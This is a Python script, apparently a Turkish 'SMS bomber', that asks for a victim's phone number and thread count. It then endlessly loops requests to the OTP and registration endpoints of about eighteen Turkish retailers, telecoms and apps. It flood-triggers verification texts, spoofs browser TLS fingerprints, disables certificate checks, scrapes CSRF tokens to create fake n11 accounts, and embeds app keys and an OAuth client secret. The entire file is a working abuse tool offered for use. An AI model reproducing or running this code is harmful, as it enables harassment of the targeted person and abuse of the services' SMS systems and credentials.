import subprocess, sys

try:
    import requests, urllib3, colorama, tls_client
except ImportError:
    print("Gerekli modüller indiriliyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "urllib3==1.26.13", "colorama==0.3.9", "requests==2.31.0", "tls_client"])
finally:
    import json, random, requests, string, urllib3, tls_client, re, math, uuid
    from colorama import Fore, Style
    from time import sleep
    from os import system
    from concurrent.futures import ThreadPoolExecutor, wait

urllib3.disable_warnings()
MAIL = ''.join(random.choice(string.ascii_lowercase) for _ in range(20)) + "@gmail.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"


class SendSms:
    adet = 0

    def __init__(self, phone):
        self.phone = str(phone)
        self.mail = MAIL

    def _post(self, url, **kw):
        return requests.post(url, timeout=10, verify=False, **kw)

    def _tls(self):
        return tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)

    def _ok(self, name):
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> {name}")
        self.adet += 1

    def _fail(self, name, ex=""):
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> {name} ({ex})")

    # ── Basit API servisleri ──────────────────────────────────

    def Bim(self):
        try:
            r = self._post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone})
            if r.status_code == 200: self._ok("bim.veesk.net")
            else: raise Exception(r.status_code)
        except Exception as ex: self._fail("bim.veesk.net", ex)

    def Suiste(self):
        try:
            r = self._post("https://suiste.com/api/auth/code", data={"action": "register", "gsm": self.phone}, headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"})
            if r.json().get("code") == "common.success": self._ok("suiste.com")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("suiste.com", ex)

    def Ayyildiz(self):
        try:
            r = self._post(f"https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}", headers={"Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp"})
            if r.json().get("Success"): self._ok("altinyildizclassics.com")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("altinyildizclassics.com", ex)

    def Happy(self):
        try:
            r = self._post("https://www.happy.com.tr/index.php?route=account/register/verifyPhone", data={"telephone": self.phone})
            if r.status_code == 200: self._ok("happy.com.tr")
            else: raise Exception(r.status_code)
        except Exception as ex: self._fail("happy.com.tr", ex)

    def Porty(self):
        try:
            r = self._post("https://panel.porty.tech/api.php?", json={"job": "start_login", "phone": self.phone}, headers={"Content-Type": "application/json; charset=UTF-8", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"})
            if r.json().get("status") == "success": self._ok("porty.tech")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("porty.tech", ex)

    def Tasimacim(self):
        try:
            r = self._post("https://server.tasimacim.com/requestcode", json={"phone": self.phone, "lang": "tr"})
            if r.status_code == 200: self._ok("tasimacim.com")
            else: raise Exception(r.status_code)
        except Exception as ex: self._fail("tasimacim.com", ex)

    def Gofody(self):
        try:
            r = self._post("https://backend.gofody.com/api/v1/enduser/register/", json={"country_code": "90", "phone": self.phone})
            if r.json().get("success"): self._ok("gofody.com")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("gofody.com", ex)

    def Karma(self):
        try:
            r = self._post("https://api.gokarma.app/v1/auth/send-sms", json={"phonenumber": f"90{self.phone}", "type": "REGISTER", "deviceId": "abc123", "language": "tr-TR"})
            if r.status_code == 201: self._ok("gokarma.app")
            else: raise Exception(r.status_code)
        except Exception as ex: self._fail("gokarma.app", ex)

    def Filemarket(self):
        try:
            r = self._post("https://api.filemarket.com.tr/v1/otp/send", json={"mobilePhoneNumber": f"90{self.phone}"}, headers={"Content-Type": "application/json"})
            if r.json().get("responseType") == "SUCCESS": self._ok("filemarket.com.tr")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("filemarket.com.tr", ex)

    def Kalemzen(self):
        try:
            r = self._post("https://kalemzen.com.tr/ajax/member/sendsms", json={"phone": f"0{self.phone}", "type": "signup"}, headers={"Content-Type": "application/json", "x-requested-with": "XMLHttpRequest", "referer": "https://kalemzen.com.tr/giris-yap"})
            if r.json().get("status") == "success": self._ok("kalemzen.com.tr")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("kalemzen.com.tr", ex)

    def Kolaydoy(self):
        try:
            r = self._post("https://api.kolaydoy.net/api/auth/set-user", data={"mobile": f"+90{self.phone}", "code": "+90"}, headers={"Origin": "https://kolaydoy.net", "Referer": "https://kolaydoy.net/"})
            if r.status_code == 200 and "mobile" in r.text: self._ok("kolaydoy.net")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("kolaydoy.net", ex)


    # ── OAuth/Token tabanlı servisler ─────────────────────────

    def Anadolusaglik(self):
        try:
            tr = self._post("https://secure.anadolusaglik.org/connect/token", data={"client_id": "iCoMed_Patient_Web", "client_secret": "ChY%*NM680c$8L", "grant_type": "client_credentials", "scope": "address email phone profile roles AgentService AppointmentService ConnectorService ContentService EResultService IOService MessageService PaymentService PrescriptionService ProfileService ResourceService SurveyService TimelineService VideoService WorkerService MarketingService DemandService"}, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if tr.status_code != 200: raise Exception("Token alınamadı")
            token = tr.json()["access_token"]
            r = self._post("https://mag.anadolusaglik.org/api/profile-service/user/notify", data=f"mobileNumber=%2B90{self.phone}", headers={"Authorization": f"Bearer {token}", "Content-Type": "application/x-www-form-urlencoded"})
            if r.status_code == 200: self._ok("anadolusaglik.org")
            else: raise Exception(r.status_code)
        except Exception as ex: self._fail("anadolusaglik.org", ex)

    def Hepsiburada(self):
        try:
            sess = requests.Session()
            sess.verify = False
            sess.headers.update({"User-Agent": UA, "Accept": "application/json, text/plain, */*", "Origin": "https://giris.hepsiburada.com", "Referer": "https://giris.hepsiburada.com/"})
            xsrf = sess.get("https://oauth.hepsiburada.com/api/authenticate/xsrf-token", timeout=10).json()["xsrfToken"]
            r = sess.post("https://oauth.hepsiburada.com/api/authenticate/gsmcheck", json={"gsm": f"+90{self.phone}"}, headers={"Content-Type": "application/json", "app-key": "AF7F2A37-CC4B-4F1C-87FD-FF3642F67ECB", "fingerprint": "8195274f463203bfc16927d9eec55420", "x-xsrf-token": xsrf}, timeout=10)
            if r.json().get("success"): self._ok("hepsiburada.com")
            else: raise Exception(r.json().get("message", ""))
        except Exception as ex: self._fail("hepsiburada.com", ex)

    # ── TLS Client tabanlı servisler ──────────────────────────

    def Sokmarket(self):
        try:
            r = self._tls().post("https://giris.ec.sokmarket.com.tr/api/authentication/otp-registration/generate", json={"clientId": "buyer-web", "phoneNumber": self.phone, "captchaToken": "", "captchaAction": "generate_register_otp", "reCaptchaV2": False}, headers={"Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Origin": "https://giris.ec.sokmarket.com.tr", "Referer": "https://giris.ec.sokmarket.com.tr/otp-register", "User-Agent": UA})
            if r.status_code == 200 and "verificationId" in r.text: self._ok("sokmarket.com.tr")
            else: raise Exception(r.text[:80])
        except Exception as ex: self._fail("sokmarket.com.tr", ex)

    def N11(self):
        try:
            sess = self._tls()
            r1 = sess.get("https://www.n11.com/uye-ol", headers={"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
            if r1.status_code != 200: raise Exception(f"Sayfa: {r1.status_code}")
            csrf_js = re.findall(r'["\']_csrf["\']\s*:\s*["\']([^"\']*)["\']', r1.text)
            if not csrf_js: raise Exception("CSRF bulunamadı")
            csrf = csrf_js[0]
            pwd = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + "!A1"
            r2 = sess.post("https://www.n11.com/buyerRegistration", json={"firstName": "Ahmet", "lastName": "", "gender": "M", "email": self.mail, "countryCode": "+90", "gsmNumber": self.phone, "password": pwd, "_forgeryToken": "", "_csrf": csrf, "agreement": "true", "_deviceId": f"MW{csrf}", "phone": self.phone, "getInfoPermission": False}, headers={"Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.n11.com", "Referer": "https://www.n11.com/uye-ol", "User-Agent": UA})
            if r2.status_code == 200 and "smsVerification" in r2.text:
                fmt = f"{self.phone[0:3]} {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:10]}"
                r3 = sess.post("https://www.n11.com/msisdnVerificationInit", json={"_csrf": csrf, "email": self.mail, "countryCode": "+90", "phone": fmt}, headers={"Content-Type": "application/json;charset=UTF-8", "Origin": "https://www.n11.com", "Referer": "https://www.n11.com/uye-ol", "User-Agent": UA})
                if r3.status_code == 200 and "otp" in r3.text.lower(): self._ok("n11.com")
                else: raise Exception(f"msisdn: {r3.status_code}")
            else: raise Exception(f"reg: {r2.status_code}")
        except Exception as ex: self._fail("n11.com", ex)

    def Tiklagelsin(self):
        try:
            sess = self._tls()
            did, sid, cid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
            h = {"Content-Type": "application/json", "User-Agent": UA, "Origin": "https://www.tiklagelsin.com", "Referer": "https://www.tiklagelsin.com/", "app-version": "4.0.0", "device-type": "2", "language": "tr-TR", "session-id": sid, "tenant-id": "9737ce1e-8d97-431c-b884-3250781af72f", "timezone": "Europe/Istanbul", "correlation-id": cid}
            r1 = sess.post("https://api.tiklagelsin.com/tg/user/api/v1/auth/generate-public-token", json={"deviceUniqueId": did}, headers=h)
            if r1.status_code != 200: raise Exception("Token alınamadı")
            h["authorization"] = f"Bearer {r1.json()['data']['token']}"
            h["correlation-id"] = str(uuid.uuid4())
            r2 = sess.post("https://api.tiklagelsin.com/tg/user/api/v1/auth/generate-otp", json={"phoneNumber": self.phone, "countryCode": "+90", "secret": self.phone}, headers=h)
            if r2.status_code == 200 and "maxTrySeconds" in r2.text: self._ok("tiklagelsin.com")
            else: raise Exception(r2.text[:80])
        except Exception as ex: self._fail("tiklagelsin.com", ex)

    # ── Çok adımlı servisler ──────────────────────────────────

    def Turktelekom(self):
        try:
            sess = requests.Session()
            sess.headers.update({"User-Agent": UA, "Accept-Language": "tr-TR,tr;q=0.9"})
            sess.verify = False
            # 1) Popup -> OAM redirect
            r1 = sess.get("https://kolaygiris.turktelekom.com.tr/kolay-giris/getLoginPopupNew", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}, allow_redirects=True, timeout=15)
            if r1.status_code != 200: raise Exception(f"Popup: {r1.status_code}")
            # 2) OAM encrypted form auto-submit
            enc = re.search(r'name="enc_post_data"\s+value="([^"]*)"', r1.text)
            act = re.search(r'<form[^>]*action="([^"]*)"', r1.text)
            if not enc or not act: raise Exception("OAM formu bulunamadı")
            r2 = sess.post(act.group(1), data={"enc_post_data": enc.group(1)}, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://kolaygiris.turktelekom.com.tr", "Referer": r1.url}, allow_redirects=True, timeout=15)
            if r2.status_code != 200: raise Exception(f"OAM: {r2.status_code}")
            # 3) CSRF + login POST
            csrf = re.search(r'name=["\']_csrf["\'][^>]*value=["\']([^"\']*)["\']', r2.text) or re.search(r'value=["\']([^"\']*)["\'][^>]*name=["\']_csrf["\']', r2.text)
            if not csrf: raise Exception("CSRF bulunamadı")
            r3 = sess.post("https://kolaygiris.turktelekom.com.tr/kolaygiris/login", data={"_csrf": csrf.group(1), "gsmNumber": self.phone, "_contsession": "on"}, headers={"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://kolaygiris.turktelekom.com.tr", "Referer": r2.url}, allow_redirects=True, timeout=15)
            if r3.status_code == 200 and "enterSmsOtp" in r3.url: self._ok("turktelekom.com.tr")
            else: raise Exception("OTP yönlendirmesi başarısız")
        except Exception as ex: self._fail("turktelekom.com.tr", ex)


# ── Servis listesi & çalıştırma ───────────────────────────────
servisler_sms = [m for m in dir(SendSms) if callable(getattr(SendSms, m)) and not m.startswith('_')]


def split_services(services, thread_count):
    chunk = math.ceil(len(services) / thread_count)
    return [services[i:i + chunk] for i in range(0, len(services), chunk)]


def run_services(sms, service_list, aralik=0):
    while True:
        for service in service_list:
            getattr(sms, service)()
            sleep(aralik)


while 1:
    system("cls||clear")
    print(f"""{Fore.RED}
█████╗ ██╗     ██╗██████╗  █████╗ ██████╗  █████╗ 
██╔══██╗██║     ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
███████║██║     ██║██████╔╝███████║██████╔╝███████║
██╔══██║██║     ██║██╔══██║██╔══██║██╔══██╗██╔══██║
██║  ██║███████╗██║██████╔╝██║  ██║██████╔╝██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝

  TT @kali_ali44  |  Api: {len(servisler_sms)}
{Style.RESET_ALL}""")

    print(Fore.LIGHTYELLOW_EX + " Telefon numarası (+90 olmadan): " + Fore.LIGHTGREEN_EX, end="")
    tel_no = input().strip()
    try:
        int(tel_no)
        if len(tel_no) != 10: raise ValueError
    except ValueError:
        print(Fore.LIGHTRED_EX + " Hatalı numara!")
        sleep(2)
        continue

    print(Fore.LIGHTYELLOW_EX + " Thread sayısı [1-100]: " + Fore.LIGHTGREEN_EX, end="")
    try:
        thread_count = int(input().strip())
        if thread_count < 1 or thread_count > 100: raise ValueError
    except ValueError:
        print(Fore.LIGHTRED_EX + " Geçersiz thread sayısı!")
        sleep(2)
        continue

    print(Fore.LIGHTYELLOW_EX + " Kaç saniye aralıkla gönderilsin: " + Fore.LIGHTGREEN_EX, end="")
    try:
        aralik = int(input().strip())
    except ValueError:
        print(Fore.LIGHTRED_EX + " Geçersiz giriş!")
        sleep(2)
        continue

    system("cls||clear")
    print(f"{Fore.LIGHTCYAN_EX}[*] Başlatılıyor... Numara: {tel_no} | Thread: {thread_count} | Aralık: {aralik}s | Durdurmak için CTRL+C{Style.RESET_ALL}\n")

    sms = SendSms(tel_no)
    service_chunks = split_services(servisler_sms, thread_count)

    try:
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(run_services, sms, chunk, aralik) for chunk in service_chunks]
            wait(futures)
    except KeyboardInterrupt:
        system("cls||clear")
        print(f"\n{Fore.LIGHTYELLOW_EX} İşlem durduruldu. Toplam gönderilen: {sms.adet}{Style.RESET_ALL}")
        sleep(3)
